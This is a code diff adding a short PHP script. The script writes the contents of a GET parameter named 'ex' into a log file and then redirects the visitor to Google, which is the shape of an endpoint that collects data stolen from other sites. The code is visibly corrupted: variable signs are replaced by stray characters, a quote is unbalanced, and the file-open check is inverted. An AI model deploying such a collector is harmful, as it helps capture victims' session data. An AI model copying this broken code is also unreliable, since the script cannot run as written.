@@ -1,0 +1,21 @@
+<?php
+$filename = "logfile.txt";
+if (isset($_GET["ex"]))
+{
+if (?ùhandle = fopen(ùfilename, 'a'))
+{
+exit;
+}
+else
+{
+if (fwrite(ùhandle, "\r\n . $_GET["ex"]) === FALSE)
+{
+exit;
+}
+}
+header("location: https://www.google.com");
+fclose($handle);
+exit;
+}
+exit;
+?>
